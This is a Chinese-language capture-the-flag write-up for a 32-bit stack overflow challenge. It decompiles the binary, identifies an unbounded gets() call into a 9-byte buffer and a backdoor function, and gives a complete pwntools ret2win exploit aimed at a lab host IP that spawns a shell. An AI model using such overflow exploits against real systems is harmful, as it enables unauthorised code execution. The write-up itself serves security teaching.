# 详细解题过程

## 1. 反编译分析（IDA / Ghidra）

### 1.1 主函数逻辑

![main() 反编译结果]({{ '/assets/images/pwn2.png' | relative_url }})

### 1.2 进入 dog() 函数

`init` 是初始化函数，可以跳过。

![dog() 反编译结果]({{ '/assets/images/pwn3.png' | relative_url }})

可以看到程序使用 `gets(s)` 读取输入，没有限制长度，是典型的栈溢出点。

再看 dog() 的栈结构：

![dog() 栈结构]({{ '/assets/images/pwn4.png' | relative_url }})

- 溢出偏移量为 `0x9 + 4`：其中 `0x9` 用于填满 9 字节的缓冲区，`4` 字节覆盖保存的 ebp，之后才是返回地址。

### 1.3 查找后门函数

确实存在后门函数：

![后门函数]({{ '/assets/images/pwn5.png' | relative_url }})

函数地址为 `0x804859B`。

## 2. 漏洞分析

- 漏洞点：`gets(s)` 未限制输入长度，而 `s` 缓冲区只有 9 字节；输入超过 13 字节就会覆盖栈上的返回地址，从而控制程序执行流程。
- 利用思路：程序开启了 NX，无法直接执行栈上的 shellcode；但存在后门函数，可以构造溢出 payload 覆盖返回地址，跳转到后门函数获取 shell。

## 3. 完整 EXP 脚本（pwntools）

```python
from pwn import *

# 连接靶场，替换为实际 IP 与端口
p = remote('1.95.36.136', 2065)

# -------------------- 关键信息 --------------------
# 溢出偏移：9 字节缓冲区 + 4 字节保存的 ebp
offset = 0x9 + 4

# 后门函数地址
backdoor = 0x804859B

# -------------------- 构造 payload --------------------
# 填充垃圾数据 + 用后门地址覆盖返回地址
payload = b'A' * offset + p32(backdoor)

# 发送攻击
p.sendline(payload)

# 获取交互式 shell
p.interactive()
```
